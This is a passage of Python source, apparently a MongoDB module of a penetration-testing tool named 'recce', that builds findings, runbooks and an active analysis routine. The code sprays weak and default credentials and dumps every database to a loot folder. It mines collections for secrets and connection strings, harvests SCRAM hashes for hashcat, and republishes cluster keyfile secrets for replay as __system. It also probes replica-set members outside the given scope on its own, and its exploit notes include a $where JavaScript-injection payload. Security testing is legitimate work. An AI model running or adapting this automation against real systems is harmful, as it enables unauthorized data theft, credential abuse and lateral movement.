                            "URI. Try the same (user,pw) on each replSet member and "
                            "OS-layer services."),
                        depth_tier="t3"))
                else:
                    out.append(_finding(
                        "high", "MongoDB credentialed access (looted / weak credential)", tgt,
                        f"recce authenticated as '{who}' (SCRAM) with a credential from the "
                        "engagement"
                        + (f" (version {ver})" if ver else "")
                        + f" and read {len(dbs)} database(s)." + extra,
                        "mongosh",
                        f"mongosh 'mongodb://{who}:<pass>@{h.ip}:{p.portid}/?authSource=admin' "
                        "--eval 'db.adminCommand({usersInfo:1,showCredentials:true})'",
                        "Rotate the credential; enforce least privilege / SCRAM-SHA-256; bind "
                        "to a trusted interface.",
                        ["CWE-522", "CWE-284"], kind="mongo_cred_access",
                        exploit_note=(
                            "mongodump --uri 'mongodb://<user>:<pw>@<ip>:<port>/"
                            "?authSource=admin' --out loot/ ; feed harvested SCRAM "
                            "hashes to hashcat -m 24100/24200."),
                        depth_tier="t3"))
            # New probe outputs — surface regardless of the access path above.
            if pr.get("scripting_enabled"):
                out.append(_finding(
                    "high", "MongoDB server-side JavaScript enabled", tgt,
                    "getParameter reports scripting=true — $where clauses, "
                    "mapReduce, and (on legacy builds) `eval` will execute "
                    "server-side JavaScript. NoSQLi in any application query "
                    "that reflects user input becomes RCE; on <=3.x an unauth "
                    "instance is direct code execution.",
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval 'db.adminCommand("
                    "{getParameter:1,scripting:1})'",
                    "Start mongod with --noscripting (or "
                    "security.javascriptEnabled: false) unless an application "
                    "requires server-side JS.",
                    ["CWE-94", "CWE-95"], kind="mongo_scripting_enabled",
                    exploit_note=(
                        "mongosh 'mongodb://<ip>:<port>/test' --eval "
                        "'db.foo.find({$where: \"sleep(150); return true\"})' - a "
                        "measurable delay proves JS execution; then swap sleep() for "
                        "a DNS(<canary>) primitive."),
                    depth_tier="t1"))
            shards = pr.get("shard_hosts") or []
            if shards:
                out.append(_finding(
                    "medium", "MongoDB sharded-cluster topology exposed", tgt,
                    f"getShardMap returned {len(shards)} cluster host(s) — the "
                    "mongos + config-server addresses of the sharded deployment: "
                    + ", ".join(shards[:8])
                    + (" …" if len(shards) > 8 else "")
                    + ". Same credentials/exposure typically apply cluster-wide.",
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
                    "'db.adminCommand({getShardMap:1})'",
                    "Bind the cluster interfaces to a trusted network; require "
                    "authentication on every shard and config server.",
                    ["CWE-200"], kind="mongo_shard_topology"))
            inv = pr.get("collection_inventory") or {}
            if inv:
                sample = []
                for db, cols in list(inv.items())[:4]:
                    sample.append(f"{db}: {', '.join(cols[:6])}"
                                  + (" …" if len(cols) > 6 else ""))
                total = sum(len(v) for v in inv.values())
                out.append(_finding(
                    "medium", "MongoDB collection inventory exposed", tgt,
                    f"recce enumerated {total} collection(s) across {len(inv)} "
                    "database(s) via listCollections. The collection names "
                    "alone reveal the data model — enough to plan a targeted "
                    "dump:\n\n" + "\n".join(sample),
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
                    "'db.adminCommand({listDatabases:1}).databases.forEach("
                    "d => print(d.name, JSON.stringify("
                    "db.getSiblingDB(d.name).getCollectionNames())))'",
                    "Restrict listCollections at the RBAC layer (revoke "
                    "listCollections from the app role); bind to a trusted "
                    "interface.",
                    ["CWE-200"], kind="mongo_collection_inventory"))
            hinfo = pr.get("host_info") or {}
            if hinfo and (hinfo.get("hostname") or hinfo.get("os_name")):
                bits = []
                if hinfo.get("hostname"):
                    bits.append(f"hostname={hinfo['hostname']}")
                if hinfo.get("os_type"):
                    bits.append(f"os_type={hinfo['os_type']}")
                if hinfo.get("os_name"):
                    bits.append(f"os={hinfo['os_name']}")
                if hinfo.get("os_version"):
                    bits.append(f"version={hinfo['os_version']}")
                detail = ("recce read hostInfo without a specific privilege - the "
                          "server returned its own OS fingerprint and hostname: "
                          + ", ".join(bits) + ".")
                # T2 SAFE PoC: a second controlled read (serverStatus) corroborates
                # the identity with live process state. Only promote when the
                # server actually answered with concrete fields.
                ss = hinfo.get("server_status") or {}
                tier = "t1"
                if ss:
                    ss_bits = []
                    if ss.get("host"):
                        ss_bits.append(f"host={ss['host']}")
                    if ss.get("process"):
                        ss_bits.append(f"process={ss['process']}")
                    if ss.get("pid"):
                        ss_bits.append(f"pid={ss['pid']}")
                    if ss.get("version"):
                        ss_bits.append(f"mongod={ss['version']}")
                    if ss.get("uptime"):
                        ss_bits.append(f"uptime={ss['uptime']}s")
                    if ss.get("localTime"):
                        ss_bits.append(f"localTime={ss['localTime']}")
                    if ss_bits:
                        detail += ("\n\nCorroborating serverStatus read (SAFE T2 "
                                   "proof-of-exploit - one controlled admin "
                                   "command, no writes): " + ", ".join(ss_bits)
                                   + ". Live process state ties the hostInfo "
                                   "fingerprint to a running mongod on this "
                                   "socket, not a stale cached document.")
                        tier = "t2"
                out.append(_finding(
                    "medium", "MongoDB host / OS fingerprint disclosed (hostInfo)", tgt,
                    detail,
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
                    "'db.adminCommand({hostInfo:1})'",
                    "Restrict the hostInfo command to trusted roles "
                    "(hostManager/clusterMonitor) and remove any unauth exposure.",
                    ["CWE-200"], kind="mongo_hostinfo", depth_tier=tier))
            warns = pr.get("startup_warnings") or []
            if warns:
                # De-dupe by 'msg' body; startup log lines often include a
                # timestamp that would otherwise inflate the count.
                seen_w: set = set()
                short = []
                for w in warns:
                    key = w[-200:] if len(w) > 200 else w
                    if key not in seen_w:
                        seen_w.add(key)
                        short.append(w)
                head = "\n".join("  - " + w for w in short[:6])
                out.append(_finding(
                    "medium",
                    "MongoDB self-reported startup warnings (misconfiguration)", tgt,
                    f"getLog:'startupWarnings' returned {len(short)} warning "
                    "line(s) from the server's own start-up log — the server is "
                    "telling you what is misconfigured:\n\n" + head
                    + ("\n  ..." if len(short) > 6 else ""),
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
                    "'db.adminCommand({getLog:\"startupWarnings\"})'",
                    "Remediate each listed warning (enable auth, bind to a "
                    "trusted interface, drop deprecated storage engines, fix "
                    "TLS / ulimit / THP settings).",
                    ["CWE-532", "CWE-16"], kind="mongo_startup_warnings"))
            cks = pr.get("cluster_keys") or []
            if cks:
                sample = cks[0]
                out.append(_finding(
                    "critical",
                    "MongoDB cluster keyfile secret exposed (local.system.keys)", tgt,
                    f"recce read {len(cks)} cluster HMAC key(s) from "
                    "local.system.keys — the internal-auth secret every "
                    "replica-set member and mongos uses to authenticate to each "
                    "other as the reserved `__system` account. Replay against "
                    "any node yields cluster-wide impersonation."
                    f"\n\nSample keyId={sample.get('keyId', '?')} "
                    f"purpose={sample.get('purpose', '?')} "
                    f"key_len={sample.get('key_len', 0)} bytes (redacted).",
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/local --eval "
                    "'db.system.keys.find().toArray()'",
                    "Bind the `local` database to a trusted interface, enforce "
                    "authentication on every node, restrict `local` reads to "
                    "cluster-admin roles, and rotate the keyFile.",
                    ["CWE-798", "CWE-522"], kind="mongo_cluster_keyfile",
                    exploit_note=(
                        "python3 -c 'import hmac,base64,hashlib; ...' to derive the "
                        "SCRAM saltedPassword from the HMAC key, then attempt "
                        "SCRAM-SHA-256 as __system against each replset_member/"
                        "shard_host - success = full cluster."),
                    depth_tier="t3"))
            dm = pr.get("datamine")
            if dm and dm.get("secret_fields"):
                sf = dm["secret_fields"]
                colls = sorted({f"{c['db']}.{c['collection']}" for c in sf})
                detail = (f"recce mined {len(sf)} sensitive field(s) across "
                          f"{len(colls)} collection(s): "
                          + ", ".join(f"{c['collection']}.{c['field']}" for c in sf[:12])
                          + (" …" if len(sf) > 12 else "") + ".")
                samples = dm.get("samples") or []
                if samples:
                    s = samples[0]
                    detail += ("\n\nSAMPLE (redacted) " + s["db"] + "." + s["collection"]
                               + ": " + ", ".join(f"{k}={v}"
                                                  for k, v in s["redacted"].items()))
                harvested = dm.get("harvested") or []
                if harvested:
                    detail += (f"\n\nHARVESTED {len(harvested)} connection string(s) -> "
                               "spray set: "
                               + ", ".join(re.sub(r":[^:@/]+@", ":****@", c)
                                           for c in harvested[:5]))
                out.append(_finding(
                    "high", "MongoDB sensitive data exposed (PII / secrets / credentials)",
                    tgt, detail, "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval "
                    "'db.getSiblingDB(\"<db>\").<collection>.find().limit(20)'   # full docs (ROE)",
                    "Encrypt sensitive fields; least-privilege the app role; remove "
                    "embedded credentials; bind to a trusted interface.",
                    ["CWE-200", "CWE-312"], kind="mongo_datamine",
                    exploit_note=(
                        "grep -E 'mongodb://|postgres://|mysql://' "
                        "loot/mongo/datamine.json - then feed each connstr to the "
                        "matching recce db probe (probe_creds)."),
                    depth_tier="t2"))
            if ver and _old_version(ver):
                out.append(_finding(
                    "medium", "MongoDB end-of-life / legacy build", tgt,
                    f"MongoDB {ver} is past end-of-life - missing security fixes, and the "
                    "pre-3.0 line shipped auth-off by default.",
                    "mongosh",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval 'db.version()'",
                    "Upgrade to a supported MongoDB release.",
                    ["CWE-1104"], kind="mongo_version"))
    return out


# --- runbook + proof + analyze --------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    steps = [
        ("recon", "nmap NSE", f"nmap -p{port} --script mongodb-info,mongodb-databases "
         f"{ip}", "Server info + database list (confirms unauth)."),
        ("enumerate", "mongosh", f"mongosh mongodb://{ip}:{port}/ --eval "
         "'db.adminCommand({listDatabases:1})'", "List databases without credentials."),
        ("loot", "mongodump", f"mongodump --host {ip} --port {port} --out loot/mongo/",
         "Dump every database to disk for offline analysis."),
    ]
    return [{"phase": ph, "tool": t, "command": c, "why": w}
            for ph, t, c, w in steps]


def proof_html(command, output, banner: str = "") -> str:
    from . import mssql
    return mssql.proof_html(command, output, prompt="> ", banner=banner)


def findings_to_vulns(fs: list[dict]) -> dict:
    from ..svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "mongodb", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            wordlist: str | None = None, **_ignored) -> dict:
    """Full MongoDB analysis. Returns {targets, findings, runbooks, probes, stats}.
    `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe.
    `wordlist` = optional path to a user-supplied credential list; augments
    the bundled weak-SCRAM sweep."""
    from .. import svcprobe
    from ...core.models import Credential
    from .base import cred_list as _cred_list
    from ..wordlists import load_cred_wordlist
    extra_creds = load_cred_wordlist(wordlist, default_user="admin")
    targets = mongodb_targets(hosts)
    probes: dict = {}
    state: dict = {}
    looted: list = []
    discovered: list = []                     # (host:port, user, pw) replica members
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if not pr:
                continue
            # Credentialed follow-through: a reachable-but-locked instance is retried
            # with each supplied/looted credential (SCRAM-SHA-256/1).
            acc_user, acc_pw = None, None
            if not pr.get("unauth"):
                for u, pw in _cred_list(creds):
                    cp = probe_creds(t["ip"], t["port"], u, pw)
                    if cp.get("cred_access"):
                        pr = cp
                        acc_user, acc_pw = u, pw
                        break
                # Nothing from the engagement worked — targeted default-cred
                # sweep. Distinct marker so findings flags it as a WEAK-DEFAULT
                # rather than a generic looted-cred access.
                if not pr.get("cred_access"):
                    weak = weak_password_sweep(t["ip"], t["port"],
                                               extra_creds=extra_creds)
                    if weak:
                        u, pw = weak
                        cp = probe_creds(t["ip"], t["port"], u, pw)
                        if cp.get("cred_access"):
                            pr = cp
                            pr["cred_source"] = "weak_default"
                            acc_user, acc_pw = u, pw
            probes[(t["ip"], t["port"])] = pr
            t["unauth"] = pr.get("unauth", False)
            t["cred_access"] = pr.get("cred_access", False)
            t["version"] = pr.get("version", "")
            t["databases"] = len(pr.get("databases") or [])
            for m in (pr.get("replset_members") or []):
                discovered.append((m, acc_user, acc_pw))
            # Exfil: mine collections for sensitive fields + embedded creds.
            if pr.get("unauth") or pr.get("cred_access"):
                dbnames = [d["name"] for d in pr.get("databases", []) if d.get("name")]
                dm = datamine(t["ip"], t["port"], dbnames, user=acc_user, password=acc_pw)
                pr["datamine"] = dm
                for cs in dm.get("harvested", []):
                    looted.append(Credential(
                        username="(embedded)", secret=cs, kind="password",
                        source="mongodb-datamine", origin_ip=t["ip"],
                        notes=f"connection string mined from MongoDB :{t['port']}"))
            # local.system.keys: the cluster-internal `__system` credential.
            # Publish one Credential per key so the wider engagement's spray /
            # relay pools can replay it against every replica-set member and
            # every mongos. The 'notes' field carries the sibling member list
            # so pivot code has an inline target inventory.
            cks = pr.get("cluster_keys") or []
            if cks:
                relay = ", ".join(sorted({m for m in
                                          (pr.get("replset_members") or [])
                                          + (pr.get("shard_hosts") or []) if m}))
                for k in cks:
                    looted.append(Credential(
                        username="__system", secret=k.get("key_b64", ""),
                        kind="password", source="mongodb-keyfile",
                        origin_ip=t["ip"],
                        notes=("MongoDB cluster keyfile secret (local.system.keys "
                               f"keyId={k.get('keyId', '?')}); replay as __system "
                               f"against replset/mongos: {relay or 'unknown'}").rstrip()))
            for hh in pr.get("hashes", []):
                looted.append(Credential(
                    username=hh["user"], secret=hh["hashcat"], kind="hash",
                    source="mongodb-loot", origin_ip=t["ip"],
                    notes=f"MongoDB SCRAM {hh['mechanism']} (hashcat "
                          f"{'24200' if '256' in hh['mechanism'] else '24100'}) :{t['port']}"))
    fs = findings(hosts, probes)
    # Lateral: auto-probe the replica-set members (additional MongoDB hosts the set
    # advertised) that aren't already in scope - they usually share the exposure/creds.
    if active and discovered:
        fs.extend(_probe_members(discovered, targets, creds))
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "credentials": looted,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "credentials": len(looted), "stopped": state.get("stopped")}}


def _probe_members(discovered: list, targets: list, creds, max_members: int = 8) -> list:
    """Probe replica-set members not already in scope. Returns finding dicts for each
    that is reachable AND accessible (unauth or the same working credential)."""
    from .base import cred_list as _cred_list
    known = {(t["ip"], t["port"]) for t in targets}
    seen: set = set()
    out: list = []
    for member, mu, mpw in discovered:
        if len(seen) >= max_members:
            break
        host, _sep, mp = member.rpartition(":")
        if not host:
            host, mp = member, str(_DEFAULT_PORT)
        portn = int(mp) if mp.isdigit() else _DEFAULT_PORT
        key = (host, portn)
        if key in known or key in seen:
            continue
        seen.add(key)
        pr = probe(host, portn)
        used = None
        if isinstance(pr, dict) and not pr.get("unauth"):
            for u, pw in ([(mu, mpw)] if mu else []) + _cred_list(creds):
                if not u:
                    continue
                cp = probe_creds(host, portn, u, pw)
                if cp.get("cred_access"):
                    pr, used = cp, u
                    break
        if not isinstance(pr, dict) or not (pr.get("unauth") or pr.get("cred_access")):
            continue
        access = ("no authentication" if pr.get("unauth")
                  else f"the harvested credential '{used}'")
        dbs = pr.get("databases") or []
        out.append(_finding(
            "high", f"MongoDB replica-set member exposed ({host}:{portn})",
            f"{host}:{portn}",
            f"The replica set advertised member {host}:{portn}; recce reached it with "
            f"{access}" + (f" (version {pr.get('version')})" if pr.get("version") else "")
            + f" and read {len(dbs)} database(s). Lateral movement: the same exposure / "
            "credential covers every node in the set.",
            "mongosh", f"mongosh mongodb://{host}:{portn}/ --eval "
            "'db.adminCommand({listDatabases:1})'   # then run `recce enum` on this host",
            "Secure every replica-set member identically; bind to a trusted interface; "
            "require SCRAM auth.",
            ["CWE-306", "CWE-284"], kind="mongo_replica_member",
            exploit_note=(
                "mongodump --host <lateral-host> --port <port> --out "
                "loot/mongo/<host>/ ; feed hashes and connstrs into the shared pools "
                "like the primary path already does."),
            depth_tier="t2"))
    return out
